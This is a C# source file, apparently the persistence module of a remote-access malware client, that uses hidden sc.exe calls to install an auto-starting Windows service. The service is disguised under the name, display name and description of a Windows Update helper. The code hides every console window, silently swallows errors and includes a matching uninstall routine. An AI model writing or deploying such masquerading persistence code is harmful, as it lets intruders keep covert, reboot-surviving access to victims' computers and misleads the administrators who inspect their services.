using System;
using System.Diagnostics;
using System.IO;
using System.ServiceProcess;
using System.Threading;

namespace Client.Install
{
    public static class ServiceInstall
    {
        private static readonly string ServiceName = "WindowsUpdateService";
        private static readonly string DisplayName = "Windows Update Helper Service";
        private static readonly string Description = "Provides support for Windows Update operations";

        public static bool Install(string executablePath)
        {
            try
            {
                if (!File.Exists(executablePath))
                    return false;

                if (ServiceExists(ServiceName))
                    return true;

                ProcessStartInfo psi = new ProcessStartInfo
                {
                    FileName = "sc.exe",
                    Arguments = $"create \"{ServiceName}\" binPath= \"{executablePath}\" start= auto DisplayName= \"{DisplayName}\"",
                    WindowStyle = ProcessWindowStyle.Hidden,
                    CreateNoWindow = true,
                    UseShellExecute = false
                };

                using (Process process = Process.Start(psi))
                {
                    process.WaitForExit();
                    if (process.ExitCode != 0)
                        return false;
                }

                SetServiceDescription(ServiceName, Description);
                
                StartService(ServiceName);

                return true;
            }
            catch
            {
                return false;
            }
        }

        private static bool ServiceExists(string serviceName)
        {
            try
            {
                ServiceController[] services = ServiceController.GetServices();
                foreach (ServiceController service in services)
                {
                    if (service.ServiceName.Equals(serviceName, StringComparison.OrdinalIgnoreCase))
                        return true;
                }
            }
            catch { }
            return false;
        }

        private static void SetServiceDescription(string serviceName, string description)
        {
            try
            {
                ProcessStartInfo psi = new ProcessStartInfo
                {
                    FileName = "sc.exe",
                    Arguments = $"description \"{serviceName}\" \"{description}\"",
                    WindowStyle = ProcessWindowStyle.Hidden,
                    CreateNoWindow = true,
                    UseShellExecute = false
                };

                using (Process process = Process.Start(psi))
                {
                    process.WaitForExit();
                }
            }
            catch { }
        }

        private static void StartService(string serviceName)
        {
            try
            {
                ProcessStartInfo psi = new ProcessStartInfo
                {
                    FileName = "sc.exe",
                    Arguments = $"start \"{serviceName}\"",
                    WindowStyle = ProcessWindowStyle.Hidden,
                    CreateNoWindow = true,
                    UseShellExecute = false
                };

                using (Process process = Process.Start(psi))
                {
                    process.WaitForExit();
                }
            }
            catch { }
        }

        public static void Uninstall()
        {
            try
            {
                if (!ServiceExists(ServiceName))
                    return;

                ProcessStartInfo stopPsi = new ProcessStartInfo
                {
                    FileName = "sc.exe",
                    Arguments = $"stop \"{ServiceName}\"",
                    WindowStyle = ProcessWindowStyle.Hidden,
                    CreateNoWindow = true,
                    UseShellExecute = false
                };

                using (Process process = Process.Start(stopPsi))
                {
                    process.WaitForExit();
                }

                Thread.Sleep(1000);

                ProcessStartInfo deletePsi = new ProcessStartInfo
                {
                    FileName = "sc.exe",
                    Arguments = $"delete \"{ServiceName}\"",
                    WindowStyle = ProcessWindowStyle.Hidden,
                    CreateNoWindow = true,
                    UseShellExecute = false
                };

                using (Process process = Process.Start(deletePsi))
                {
                    process.WaitForExit();
                }
            }
            catch { }
        }
    }
}
